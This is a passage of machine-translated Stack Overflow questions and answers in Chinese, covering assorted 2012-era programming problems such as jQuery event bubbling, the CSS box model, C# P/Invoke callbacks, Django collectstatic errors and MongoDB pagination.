我在 Windows 7 上的 WAMP 中运行 Magento 1.7.0.1。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:23:13.490

我现在已经解决了这个问题 - 它需要设置“visible_on_front”属性，而不仅仅是“可见”。即我在上面的脚本中添加了这一行，它现在可以工作了：

```
'visible_on_front'  => true, 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:27:48.710

这个属性不是布尔值，它是整数。所以你已经设置了 1 = true 0 = false;

# image-processing - 删除多页 tif 中的分页符以制作一页长页

> ID：13313594
> 
> 赞同：2
> 
> 时间：2012-11-09T18:08:22.307
> 
> 标签：image-processing, tiff

我有一些包含多个页面的 tif 文件，我想将其转换为单个长页面。即一个包含两个页面的文件，每个页面为 8.5x11，将被转换为大小为 8.5x22 的结果文件。有什么办法可以去掉分页符吗？

我*不是*在问如何将多个文件转换为一个文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-14T22:42:47.393

我已经解决了这个问题。以下代码中有很大一部分来自[本页](http://www.hanselman.com/blog/CompositingTwoImagesIntoOneFromTheASPNETServerSide.aspx "this page")上的[Scott Hanselman](https://stackoverflow.com/users/6380/scott-hanselman "斯科特·汉塞尔曼")。

此 C# 函数采用源图像的文件名和 tiff 输出的保存位置：

```
public static void RemovePageBreaks(string fileInput, string fileOutput)
        {
            using (Image image = Image.FromFile(fileInput))
            using (MemoryStream m = new MemoryStream())
            {
                int width = image.Width;
                int height = 0;
                int pageCount = image.GetFrameCount(FrameDimension.Page);
                height = image.Height * pageCount;
                int pasteFrom = 0;
                using (Bitmap compositeImage = new Bitmap(width, height))
                using (Graphics compositeGraphics = Graphics.FromImage(compositeImage))
                {
                    compositeGraphics.CompositingMode = System.Drawing.Drawing2D.CompositingMode.SourceCopy;
                    for (int page = 0; page < pageCount; page++)
                    {

                        image.SelectActiveFrame(FrameDimension.Page, page);
                        image.Save(m, image.RawFormat);
                        Rectangle rect = new Rectangle(0, pasteFrom, image.Width, image.Height);
                        compositeGraphics.DrawImageUnscaledAndClipped(image, rect);
                        pasteFrom += image.Height;
                    }
                    compositeImage.Save(fileOutput, System.Drawing.Imaging.ImageFormat.Tiff);
                }

            }
        } 
```

# javascript - 在一个处理程序中添加的类并已激活另一个处理程序

> ID：13313599
> 
> 赞同：1
> 
> 时间：2012-11-09T18:08:36.737
> 
> 标签：javascript, jquery, html

*关于标题：我真的想不出更好的方式来描述这个。*

我在[这里](http://hunpony.hu/today/faq/hu/)有这个网页，这是我使用的 jQuery 代码：

```
$('a[class]').click(function(){
    var clas = $(this).attr('class');

    $('#'+clas.substring(0,2)).fadeTo('fast',1).removeClass('faded');
    $('p:not(#'+clas.substring(0,2)+')').fadeTo('fast',0.3);
    $('.ans:visible').toggle('slow');
    $('#'+clas.substring(0,2)+'a'+':hidden').fadeIn('slow');
    $('p:not(#'+clas.substring(0,2)+')').addClass('faded') //the class gets added
});
$('p:not(p.faded)').click(function(){ //right after it fires this
    $('p.faded').fadeTo('fast',1).removeClass('faded');
    $('.ans:visible').toggle('slow');
}); 
```

HTML

```
<p id="q1">1\. <a class="q1">Nem látom a kedvenc karakterem, hozzá tudod adni?</a>
    <br>
    <span id="q1a" style="display:none;" class="ans">
        Persze. Írj egy e-mail-t a <a href="mailto:djdavid98+mlptoday@gmail.com?subject=MLP Today Karakterkérés" target="_blank">djdavid98@gmail.com</a> címre a karakter nevével.
        <br>
        <span style="color:red">OC-kat és fillyket NEM adok hozzá.</span>
    </span>
    </p>

    <p id="q2">2\. <a class="q2">Hogyan tudok karaktert választani?</a>
    <br>
    <span id="q2a" style="display:none;" class="ans">
        Látogass el a <a href="../../img/?from=faq_hu">Karakterválasztás</a> oldalra, ahol.
        <br>
        Haználhatod továbbá a "<i>Véletlenszerű karakter</i>" linket is.
    </span>
    </p>

    <p id="q3">3\. <a class="q3">Mi ennek az oldalnak a célja/alapötlete?</a>
    <br>
    <span id="q3a" style="display:none;" class="ans">
        Eredetileg a <a href="http://milyennapvanma.hu/" target="_blank">milyennapvanma.hu</a> weboldal pónisított változataként indult,
        <br>
        de azóta már nagy mértékben továbbfejlődött az oldal.
    </span>
</p> 
```

正如您在[页面](http://hunpony.hu/today/faq/hu/)上看到的那样，单击任何带编号的链接都会立即显示和隐藏，这表明上述两个代码都运行了，但第二个代码只应在用户再次单击文本/链接时运行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:19:35.643

添加 stopPropagation() 这个链接是小提琴[http://jsfiddle.net/GSwDN/](http://jsfiddle.net/GSwDN/)

```
$('a[class]').click(function(e){
    e.stopPropagation();
    var clas = $(this).attr('class');

    $('#'+clas.substring(0,2)).fadeTo('fast',1).removeClass('faded');
    $('p:not(#'+clas.substring(0,2)+')').fadeTo('fast',0.3);
    $('.ans:visible').toggle('slow');
    $('#'+clas.substring(0,2)+'a'+':hidden').fadeIn('slow');
    $('p:not(#'+clas.substring(0,2)+')').addClass('faded') //the class gets added
});
$('p:not(p.faded)').click(function(){ //right after it fires this
    $('p.faded').fadeTo('fast',1).removeClass('faded');
    $('.ans:visible').toggle('slow');
}); 
```

您的代码可以更好/清理，但是当您单击锚点时，它会冒泡到父 p 激活对 p 的单击，这就是为什么您看到两个事件都在触发

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-09T18:35:24.860

对于闪烁效果，我建议使用 CSS3 功能。

```
@-webkit-keyframes 'blink' {
0% { background: rgba(255,0,0,0.5); }
50% { background: rgba(255,0,0,0); }
100% { background: rgba(255,0,0,0.5); }
}
.animate {
-webkit-animation-direction: normal;
-webkit-animation-duration: 1s;
-webkit-animation-iteration-count: infinite;
-webkit-animation-name: blink;
-webkit-animation-timing-function: ease;   
} 
```

然后，我会将此类添加到 onclick 事件内的按钮中：

```
$('a[class]').click(function(e){
  $(this).addClass('animate')  
} 
```

这节省了您的时间，但也使您的 JS 看起来更干净。

# html - 像素不会累加

> ID：13313604
> 
> 赞同：0
> 
> 时间：2012-11-09T18:08:51.890
> 
> 标签：html, css

我的像素计算没有加起来有问题。

我有一个主 div ( `#page`) 是：980px 宽 它有一个子 div ( `#content`) 也是：980px 宽

在 div ( `#content`) 内有两个 div ( `#left-pane`)，宽度为 300px 和 (#right-pane)，宽度为 676 px。

它们都有一个 1px 的边框 - 水平看整个网站，这应该是 4px 的宽度。

所以，

300 像素 + 676 像素 + 4 像素 = 980 像素

尽管如此，我的 div ( `#right-pane`) 向下移动到 div ( `#left-pane`) 下方。为什么？

我在它们两个上都设置了填充和边距。

HTML：

```
<head>
<title>Brazil Learner | The easy was to master Brazilian-Portuguese</title>
<link href="styles.css" rel="stylesheet" type="text/css">
</head>

<body>

<div id="page">

<div id="top">
<img class="logo" src="images/logo.png" />
<ul class="social">
    <li>1</li>
    <li>2</li>
    <li>3</li>
</ul>
</div>

<div id="nav">
<div class="nav-button"><a href="#">Home</a></div>
<div class="nav-button"><a href="#">Lessons</a></div>
<div class="nav-button"><a href="#">Guides</a></div>
<div class="nav-button"><a href="#">About us</a></div>
</div>

<div id="content">

<div id="left-pane">
</div>

<div id="right-pane">
</div>

</div>

<div id="footer">
<div>

</div> <!-- Page closer -->

</body>

</html> 
```

CSS：

```
html,body,p,ul,li,img,h1,h2,h3 {
margin: 0;
padding: 0;
border: 0;
font-size: 100%;
font: inherit;
vertical-align: baseline;
}

a {
text-decoration: none;
color: black;   
}

#page {
width: 980px;
margin: 0px auto;
}

/* Top */

#top {
border: 1px solid black;
overflow: hidden;
padding: 30px 30px;
}

.logo {
float: left;
width: 130px;
height: 130px;
}

.social {
float: right;
margin-right: 40px;
}

.social li {
display: inline;
margin: 0px 10px 0px 0px;
}

/* Nav */

#nav {
border: 1px solid red;
overflow: hidden;
margin-bottom: 20px;
}

.nav-button {
float: left;
width: 100px;
margin-right: 6px;
background-color: grey;
text-align: center;
}

/* Content */

#content {
margin-bottom: 20px;
overflow: hidden;
width: 980px;
}

#left-pane {
float: left;
width: 300px;
height: 700px;
border: 1px solid green;
}

#right-pane {
float: right;
width: 676px;
height: 700px;
border: 1px solid black;
}

/* Footer */

#footer {
float: left;
width: 980px;
height: 70px;
border: 1px solid blue;
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-09T18:13:35.747

我不确定这是否有效，但添加它并查看它是否有效。

```
* {
 -moz-box-sizing: border-box;
 -webkit-box-sizing: border-box;
  box-sizing: border-box; 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:26:33.397

您使用什么浏览器来测试您的网站？

我把你的代码扔在小提琴上，它在我的 Firefox 中看起来很好，这表明你可能正在 IE 中查看它，并且可能在非标准模式或旧版本中查看。

如果是这样，那是由于 IE（即旧版本）如何处理盒子模型和数学。对于 IE， 300px + 676px + 4px > 980px 。解决这个问题的最简单方法是将影响宽度的东西减少 1-2px，它可能会修复它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:16:59.210

要考虑 div 的宽度，您应该考虑 4 个组件

1.  div 本身的宽度（例如，这是您的文本所在的位置）
2.  填充宽度（围绕上面第 1 点中提到的宽度）
3.  边框的宽度（围绕填充）
4.  边距（围绕边界）

所以，如果你搜索 CSS 盒子模型（一些例子在这里[http://www.w3.org/TR/CSS2/box.html](http://www.w3.org/TR/CSS2/box.html)和这里[http://www.w3schools.com/css/css_boxmodel.asp](http://www.w3schools.com/css/css_boxmodel.asp)），您将能够看到可以帮助您的盒子模型。同样使用 jQuery，您可以使用以下方法检索每个部分的宽度：[.width()](http://api.jquery.com/width/)、[.innerWidth()](http://api.jquery.com/innerWidth/)和[.outerWidth()](http://api.jquery.com/outerWidth/)。请注意，您可能需要进行一些计算才能找到边框宽度、填充宽度或边距宽度。

阅读 CSS 文档和 jQuery 文档以更清楚地了解它们是如何工作的。如果您需要一些具有可变宽度对象的精确值，有时您可能需要使用 jQuery 为您正确计算宽度。

# python - Django收集静态错误

> ID：13313609
> 
> 赞同：0
> 
> 时间：2012-11-09T18:09:12.913
> 
> 标签：python, django

错误：

```
这将覆盖现有文件！

  你确定要这么做吗？
键入“yes”继续，或“no”取消：yes 

  Traceback（最近一次调用最后）：

  文件“manage.py”，第 14 行，在 <module> 

  execute_manager(settings)

  文件“D:\CODE\wamp\ www\AMBIENTES\env\Lib\site-packages\django\core\management\__init__.py”，第 459 行，在 execute_manager 

  utility.execute()

  文件“D:\CODE\wamp\www\AMBIENTES\env\Lib\ site-packages\django\core\management\__init__.py"，第 382 行，在执行

  self.fetch_command(subcommand).run_from_argv(self.argv)

  文件“D:\CODE\wamp\www\AMBIENTES\env\Lib\ site-packages\django\core\management\base.py"，第 196 行，在 run_from_argv 

  self.execute(*args, **options.__dict__)

  文件“D:\CODE\wamp\www\AMBIENTES\env\Lib\site-packages\django\core\management\base.py”，第 232 行，在执行

  输出 = self.handle(*args, **options)

  文件“D:\CODE\wamp\www\AMBIENTES\env\Lib\site-packages\django\core\management\base.py”，第 371 行，句柄

  返回 self.handle_noargs(**options)

  文件“D: \CODE\wamp\www\AMBIENTES\env\Lib\site-packages\django\contrib\staticfiles\management\commands\collectstatic.py”，第 163 行，在 handle_noargs 中

  收集 = self.collect()

  文件“D:\CODE \wamp\www\AMBIENTES\env\Lib\site-packages\django\contrib\staticfiles\management\commands\collectstatic.py"，第 113 行，在收集

  处理程序中（路径、前缀路径、存储）

  文件“D:\CODE\wamp\www\AMBIENTES\env\Lib\site-packages\django\contrib\staticfiles\management\commands\collectstatic.py”，第 287 行，

  如果不是 self.delete_file（路径， prefixed_pa​​th , source_storage):

  文件 "D:\CODE\wamp\www\AMBIENTES\env\Lib\site-packages\django\contrib\staticfiles\management\commands\collectstatic.py"，第 219 行，在 delete_file 

  self.storage.modified_time （prefixed_pa​​th）

  文件“D:\CODE\wamp\www\AMBIENTES\env\Lib\site-packages\django\core\files\storage.py”，第 264 行，在 modified_time

  返回 datetime.fromtimestamp(os.path.getmtime (self.path(name))) 

  ValueError: 平台 localtime()/gmtime() 函数的时间戳超出范围
(环境) D:\CODE\wamp\www\lezcheung\lezcms>

```

有谁知道帮帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T19:38:11.500

`collectstatic`这看起来像是由于上次修改的时间戳非常不准确（如 1970 年之前）而收集的文件引起的。尝试在谷歌上搜索允许您修改文件的最后修改日期并将其更改为合理的工具。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-09T06:33:05.050

我解散了。

这只是因为我在 /static/fonts/ 中放了一些字体，而 django 不接受静态文件夹上的字体。所以，我将此文件更改为/media/fonts/。

工作！:D

# android - android 显示警报，从非活动类弹出

> ID：13313612
> 
> 赞同：0
> 
> 时间：2012-11-09T18:09:35.533
> 
> 标签：android

> **可能重复：**
> [非活动类中的警报对话框](https://stackoverflow.com/questions/12890957/alert-dialog-in-non-activity-class)

我有网络服务的错误拦截器。我想向用户显示错误消息。拦截器不是活动，服务类。它是由框架resttemplate创建的，没有上下文。为什么很难向用户当前的Activity发送消息？比较 Aplle(iOS) 是非常简单的任务，这是非常可笑的。

# c# - 使用包含来自 C# 的 char* 的回调函数调用 C++ DLL

> ID：13313614
> 
> 赞同：1
> 
> 时间：2012-11-09T18:09:37.920
> 
> 标签：c#, pinvoke

我有一个 C++ DLL ( *SimpleDLL.dll* )，带有一个公开的函数 ( *DllFunctionPoibnterGetName* )，它有一个函数指针 ( *getNameFP* )。函数指针将 char * 作为参数 (*char * name*)。

```
// C++ 
DllExport void DllFunctionPoibnterGetName( void (*getNameFP) (char * name, unsigned short * length ) ) {

    char name[1024];
    unsigned short length = 0 ; 
    getNameFP( name, &length ); 

    printf( "length=[%d] name=[%s]\n", length, name ); 
} 
```

我有一个想要使用这个 C++ DLL 的 C# 应用程序。

```
// C# 
public unsafe delegate void GetName( System.Char* name, System.UInt16* length); 
unsafe class Program
{
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate void delegateGetName(System.Char* name, System.UInt16* length);

    [DllImport("SimpleDLL.dll", CharSet = CharSet.Ansi )]
    public static extern void DllFunctionPoibnterGetName([MarshalAs(UnmanagedType.FunctionPtr)] delegateGetName getName);

    static void Main(string[] args)
    {   
        DllFunctionPoibnterGetName(GetName); 
    }

    static void GetName(System.Char* name, System.UInt16* length)
    {
        // name = "one two three";
        *length = 10; 
    }   
} 
```

目前我可以毫无问题地设置长度，但我似乎找不到正确设置名称的方法。

**我的问题是**

*   如何正确地将*char **名称设置为一个值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:46:24.710

你不需要使用不安全的代码。你可以这样做：

```
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate void delegateGetName(IntPtr name, out ushort length);
....
static void GetName(IntPtr name, out ushort length)
{
    byte[] buffer = Encoding.Default.GetBytes("one two three");
    length = (ushort)buffer.Length;
    Marshal.Copy(buffer, 0, name, buffer.Length);
} 
```

虽然这个接口设计只是要求缓冲区溢出。你怎么知道非托管缓冲区有多大？`length`传递参数会更有意义`ref`。在输入时它会告诉你缓冲区有多大。在输出时，您会记录复制到缓冲区中的字节数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T18:39:11.643

铸造 char 是不行的。char * 数据是“非托管”的本机数据。而 C# 使用“托管”的 .NET 数据。

您需要为您的调用制作一个包装器，并使用 marschall 将数据从“非托管”转换为“托管”。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-09T18:12:58.187

将 char* 转换为 char[]。这应该够了吧。

# objective-c - Build & Archive / TestFlight 中的行为与直接构建到设备不同

> ID：13313621
> 
> 赞同：1
> 
> 时间：2012-11-09T18:10:00.883
> 
> 标签：objective-c, ios, xcode, ios-simulator, testflight

我最近在我的应用程序中添加了长按表格单元格内的 UILabel 以使“复制”菜单出现的功能，以便用户可以将文本复制到粘贴板。它在模拟器中和直接构建到设备时都很好用。但是，当我构建和存档（以便我可以推送到 TestFlight）时，该功能不起作用。

我尝试了[这个 Stack Overflow question](https://stackoverflow.com/questions/8813711/why-is-xcode-archive-acting-different-than-xcode-build-run-on-iphone)中的解决方案，但它没有用（而且似乎不相关，因为我正在为 iOS 5.0+ 构建）。我在构建设置中设置了*优化级别。*`None [-O0]`

1.  如果它在 Xcode 中运行良好，我该如何调试失败的地方？（IE，是手势识别器不工作，还是 UIMenuController 等）
2.  为什么存档副本的行为与构建到设备的副本不同？

这是相关代码（尽管我 90% 确定问题不是此代码，而是一些 Xcode 设置）：

**添加手势识别器：**

```
UIGestureRecognizer *longPress = [[UILongPressGestureRecognizer alloc]
                                              initWithTarget:self action:@selector(handleLongPressForCopy:)];
[_postLabel addGestureRecognizer:longPress];            
[self addSubview:_postLabel]; 
```

**手柄长按**

```
- (void)handleLongPressForCopy:(UILongPressGestureRecognizer *)recognizer {
    switch (recognizer.state) {
        case UIGestureRecognizerStateBegan:            
            NSAssert([self becomeFirstResponder], @"Sorry, UIMenuController will not work with %@ since it cannot become first responder", self);
            UIMenuController *theMenu = [UIMenuController sharedMenuController];
            CGRect displayRect = CGRectMake(_postLabel.frame.origin.x, _postLabel.frame.origin.y, 10, 0);
            [theMenu setTargetRect:displayRect inView:self];
            [theMenu setMenuVisible:YES animated:YES];

            break;
        default:
            break;
    }

}
- (BOOL)canPerformAction:(SEL)action withSender:(id)sender {
    return (action == @selector(copy:) );
} 
```

正如我所说，它对设备和模拟器的构建效果很好，而不是在构建和存档之后。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T01:03:06.483

`NSAssert`在发布版本中未调用该方法，因为该`-DNS_BLOCK_ASSERTIONS`标志已为发布版本启用。

在上面的代码中，我通过移动`[self becomeFirstResponder]`到它自己的行来解决这个问题，将返回值分配给一个 BOOL，然后在 BOOL 上调用 NSAssert。

# php - 如何每天自动运行一个php脚本？

> ID：13313624
> 
> 赞同：9
> 
> 时间：2012-11-09T18:10:08.810
> 
> 标签：php, mysql, cron

> **可能重复：**
> [如何在 cron 中运行 php 脚本](https://stackoverflow.com/questions/692208/how-to-run-a-php-script-in-cron)

我需要在每天的预定时间运行一个 php 脚本来更新数据库中的一些字段并发送自动电子邮件。我怎么能做到这一点？

是否可以在 XAMP 服务器中编写一些服务以每天在预定时间运行脚本？我不知道如何更新数据库并在预定时间自动发送电子邮件。任何人都可以分享一些想法或概念吗？

我正在使用在 Linux 服务器上运行的 PHP 和 MySQL。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-09T18:12:23.063

> 是否可以在 XAMP 服务器中编写一些服务以每天在预定时间运行脚本？

创建一个[Cron 作业](http://www.thesitewizard.com/general/set-cron-job.shtml)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-09T18:11:48.387

查看 CRON 作业：[http](http://en.wikipedia.org/wiki/Cron) ://en.wikipedia.org/wiki/Cron他们将允许您安排多个脚本自动运行，而无需您按照确定的时间表进行干预。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-09T18:12:20.303

你应该使用 cron 作业，它会自动运行你的脚本

[http://www.thegeekstuff.com/2011/07/php-cron-job/](http://www.thegeekstuff.com/2011/07/php-cron-job/)

# python - 像 Google App Engine 的 statsd + 石墨之类的东西？

> ID：13313626
> 
> 赞同：4
> 
> 时间：2012-11-09T18:10:15.003
> 
> 标签：python, google-app-engine

我是 GAE 的新手，虽然我环顾四周，但我没有看到任何模仿 GAE 的 statsd 功能的东西。基本上，拥有可以轻松设置统计数据并查看结果图表的东西会很好。

[http://codeascraft.etsy.com/2011/02/15/measure-anything-measure-everything/](http://codeascraft.etsy.com/2011/02/15/measure-anything-measure-everything/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T19:38:35.317

对 statsd 来说似乎很难的一件事是处理无限量的数据。如果您对聚合应用程序统计信息（跨整个数据集）感兴趣，我建议您将 App Engine Log API 或 App Engine Datastore 与[Google BigQuery](https://developers.google.com/bigquery/)结合使用。

如果您对分析 App Engine 日志特别感兴趣，可以查看两个有助于将 App Engine 日志数据移至 BigQuery 的项目：

*   [log2bq](http://code.google.com/p/log2bq/)，一个用于 GAE 日志的 Python 应用程序->BigQuery
*   [Mache](http://blog.streak.com/2012/07/export-your-google-app-engine-logs-to.html)，一个将 GAE 日志数据推送到 BigQuery 的框架（我知道你在问 Python ，但这个是用 Java 编写的）

对于一般的统计数据收集和分析，还可以将 Datastore 数据移动到 BigQuery 中进行分析。GAE 团队最近开始测试一项功能，该功能可将数据从实验性 Datastore 备份工具直接导入 BigQuery。检查[此链接](https://docs.google.com/a/google.com/spreadsheet/viewform?formkey=dHdpeXlmRlZCNWlYSE9BcE5jc2NYOUE6MQ)以获取更多信息。

BigQuery 本身不提供可视化工具，但是有很多方法可以可视化 BigQuery 的查询结果，示例包括：

*   [谷歌图表工具 API](https://developers.google.com/chart/)
*   [Google Apps 脚本](https://developers.google.com/apps-script/articles/bigquery_tutorial?hl=en)
*   [画面](https://plus.sandbox.google.com/116015649554712337984/posts/CeXBgH2xzPo)
*   [QlikView](http://market.qlikview.com/qlikview-connector-for-google-bigquery.html)

[BigQuery 第三方工具](https://developers.google.com/bigquery/docs/third_party_tools)页面上还有更多内容。

# c# - 搜索标题并将该标题放入列表中

> ID：13313631
> 
> 赞同：0
> 
> 时间：2012-11-09T18:10:45.280
> 
> 标签：c#, linq, text-files

我有一个包含博文的文本文件，每个博文都分为标题和内容，如下所示

```
 #Header
    A post
    #Content
    My content goes here...
    #Header
    Another post
    #Content
    My content goes here... 
```

现在我想抓取所有标题，#Header 之后和 #Content 之前的文本，并将其放入`List<>`. 我怎样才能做到这一点？

到目前为止，这是我想出的：

```
var headers = new List<string>();

using (StreamReader reader = new StreamReader(Path))
        {
            string line;

            while ((line = reader.ReadLine()) != null)
            {
                headers.AddRange(line)
                    .SkipWhile(l => l != "#Header")
                    .Skip(1)
                    .TakeWhile(l => !l.StartsWith("#"))
                    .ToList();
            }
        } 
```

首选 Linq。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:18:49.623

未经测试，但是这样的事情怎么样（假设文件不是*那么*长）：

```
var headers = reader.ReadToEnd()
    .Split(new[]{"#Header"}, StringSplitOptions.RemoveEmptyEntries)
    .Select(x => x.Split(new[]{"#Content"})[0].Trim())
    .ToList(); 
```

或者，如果文件很长，则逐行读取：

```
List<string> headers = new List<string>();

string line;
bool inHeader = false;
StringBuilder header = new StringBuilder();

while((line = reader.ReadLine()) != null)
{
    if(!inHeader)
    {
        if (line == "#Header") inHeader = true;
    }
    else if (line == "#Content")
    {
        headers.Add(header.ToString());
        header.Clear();
        inHeader = false;
    }            
    else
    {
        header.AppendLine(line);
    }
}

if(inHeader) headers.Add(header.ToString()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T18:26:49.413

假设您的文件可能很长：

```
bool header = false;
while(line = reader.readLine())
{
    if(header) headers.add(line);
    if(String.Compare(line,"#Header", false) == 0)
    {
        header = true;
    }
    else if(String.Compare(line,"#Content", false) == 0)
    {
        header = false;
    }
} 
```

当然，这假设您的标题总是正好一行长（否则一个标题可能会导致您的 headers 变量中有多个条目）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-09T18:37:55.110

你可以`regex`使用`LINQ`

```
string contents = File.ReadAllText("yourTextFile.txt");

List<string> header=Regex.Matches(contents,@"#Header\s*(.*?)\s*#",RegexOptions.IgnoreCase | RegexOptions.Singleline)
.Cast<Match>()
.Select(x=>x.Groups[1].Value).ToList<string>(); 
```

# asp.net-mvc-4 - 将 Twitterizer 与 ASP.NET MVC4 一起使用

> ID：13313632
> 
> 赞同：1
> 
> 时间：2012-11-09T18:10:47.833
> 
> 标签：asp.net-mvc-4, asp.net-web-api, twitterizer

我正在尝试使用 Twitterizer，但无法将其安装在 MVC4 之上。该问题是由同一包的不同版本要求引起的：Newtonsoft.JSON。ASP.NET Web API 和 Twitterizer 依赖于不同版本的 Newtonsoft.JSON。当我强制 Twitterizer 使用 Web API 的兼容版本的 Newtonsoft.JSON 时，我开始遇到奇怪的与 JSON 解析相关的错误。我怎样才能让它们一起工作，或者有什么方法可以暂时禁用 Web API，因为我目前不需要它。

# mongodb - 迭代具有相等值的文档

> ID：13313638
> 
> 赞同：0
> 
> 时间：2012-11-09T18:11:01.837
> 
> 标签：mongodb, mongodb-query, database, nosql

我在 mongo db 中有一组带有“votes”字段的博客文章：

```
> db.posts.find({}, {_id:0, votes: 1})
{ "votes" : 1 }
{ "votes" : 2 }
{ "votes" : 2 }
{ "votes" : 3 }
{ "votes" : 3 } 
```

比我有一个网络界面来显示每页一个帖子和控件（下一个，上一个）来滑动按投票排序的帖子。我将下一个/上一个帖子的请求发送到具有当前投票计数的服务器并选择新的。所以我得到下一个查询（每个http请求一个）

```
> db.things.find({vote: {$gt: 0}}, {_id:0, votes:1}).limit(1) // current votes == 0
{ "votes" : 1 }
> db.things.find({vote: {$gt: 1}}, {_id:0, votes:1}).limit(1) // current votes == 1
{ "votes" : 2 }
> db.things.find({vote: {$gt: 2}}, {_id:0, votes:1}).limit(1) // current votes == 2
{ "votes" : 3 }
... 
```

如您所见，跳过了等于“投票”的文档。所以我需要一些方法来使文档唯一并迭代相等的投票（投票字段可能会经常更新，并且每个文档都有许多相等的值）。

有没有办法解决这个问题？看起来我需要某种搜索索引。但正如我所说，标准字段变化非常频繁，我计划拥有数百万个文档。这意味着索引更新将是非常昂贵的操作，我希望系统对更新做出安全响应。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T18:39:09.450

如果您不关心返回结果的顺序，则应按顺序对它们进行排序`_id`，然后用于`{$gt: current_id}`获取下一个：

```
db.things.findOne({}, {votes: 1}).sort({_id: 1}) // _id == 0
db.things.findOne({_id: {$gt: 0}}, {votes: 1}).sort({_id: 1}) // _id == 1
db.things.findOne({_id: {$gt: 1}}, {votes: 1}).sort({_id: 1}) // _id == 2
... 
```

如果您需要它们按 订购`votes`，那么您需要`skip`改用：

```
db.things.findOne({}, {votes: 1}).sort({votes: 1})
db.things.findOne({}, {votes: 1}).sort({votes: 1}).skip(1)
db.things.findOne({}, {votes: 1}).sort({votes: 1}).skip(2)
... 
```

但这会变得越来越慢，因为您必须越来越多地跳入结果集中。

# css - css：z-index 和 float-right

> ID：13313639
> 
> 赞同：1
> 
> 时间：2012-11-09T18:11:09.963
> 
> 标签：css, z-index

我正在尝试将我的菜单 div 放到 facebook 共享 div 上。主要问题是，z-index 不起作用，即使我在两个 div 上都使用 position:relative。你知道吗，我该如何解决？PS我在你可以看到的地方添加了照片，到底出了什么问题

[http://img4.imageshack.us/img4/1563/problemscreenshot.png](http://img4.imageshack.us/img4/1563/problemscreenshot.png)

```
 <div id="facebook_connect">
                    <a href="something,something,something-thedarkside">
                        <img src="/img/facebook_connect.png"/>
                    </a>
                </div>
                <div id="header_menu">
                    <ul>
                        <li class="menu_link_left highlight"><a href="<?php echo $this->url(array(), 'index') ?>">Strona główna</a></li>
                        <li class="menu_link_inside"><a href="<?php echo $this->url(array(), 'onas') ?>">O nas</a></li>
                        <li class="menu_link_inside"><a href="<?php echo $this->url(array(), 'uslugi') ?>">Usługi</a></li>
                        <li class="menu_link_right"><a href="<?php echo $this->url(array(), 'kontakt') ?>">Kontakt</a></li>
                    </ul>
                </div> 
```

和CSS代码：

```
#facebook_connect{
    height:50px;
    width:20px;
    top:30px;
    position:relative;
    z-index:1;
    float:right;
}
#facebook_connect a, img{
    position:relative;
    z-index:1;
}

/*=======================================*/

#header_menu{
    position:relative;
    z-index:2;
    height:30px;
    width:350px;
    background:#ececec;
    border-radius:5px;
    float:right;
    top:60px;
    -moz-box-shadow: 0px 0px 6px #000;
    -webkit-box-shadow: 0px 0px 6px #000;
    box-shadow: 0px 0px 6px #000;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T19:12:46.177

所以，如果我没记错的话，你想要完成的是让你的 Facebook 分享按钮在你的导航*下方*，我假设你希望它从顶部突出一点，给它一个有点分层的效果。

如果是这种情况，则问题不在于 z-index，而是定位问题。您可以通过将两个 div 放在一个容器中来纠正此问题。试试这个：

HTML：

```
<div id="cont">

<div id="header_menu">
    <ul>
        <li class="menu_link_left highlight"><a href="<?php echo $this->url(array(), 'index') ?>">Strona główna</a></li>
        <li class="menu_link_inside"><a href="<?php echo $this->url(array(), 'onas') ?>">O nas</a></li>
        <li class="menu_link_inside"><a href="<?php echo $this->url(array(), 'uslugi') ?>">Usługi</a></li>
        <li class="menu_link_right"><a href="<?php echo $this->url(array(), 'kontakt') ?>">Kontakt</a></li>
    </ul>
</div>
<div id="facebook_connect">
    <a href="something,something,something-thedarkside">
        <img src="/img/facebook_connect.png"/>
    </a>
</div>

</div> 
```

CSS：

```
#cont {
  position: relative;
  top:60px;
  float:right;
}

#facebook_connect{
  position:absolute;
  top: 5px;
  right: 20px;
  height:50px;
  width:20px;
  z-index:1;
}

#header_menu{
  position: relative;
  height:30px;
  width:350px;
  background:#ececec;
  border-radius:5px;
  -moz-box-shadow: 0px 0px 6px #000;
  -webkit-box-shadow: 0px 0px 6px #000;
  box-shadow: 0px 0px 6px #000;
  z-index:2;
} 
```

然后按您认为合适的位置。

# php - PHP提取并计算多维数组中每个元素的第一个元素

> ID：13313641
> 
> 赞同：2
> 
> 时间：2012-11-09T18:11:33.323
> 
> 标签：php, arrays, multidimensional-array

我在php中有这个数组，

```
 $mainArray = array(
      array("apple","two", "grren"),
      array("samsung","five", "red"),
      array("microsoft","one","gray"),
      array("apple","nine", "blue"),
      array("samsung","ten", "white"),
      array("nokia","seven", "yellow")
   ); 
```

我可以轻松地遍历它并提取每个数组的所有第一个条目，如下所示：

```
 foreach($mainArray as $w => $n) {
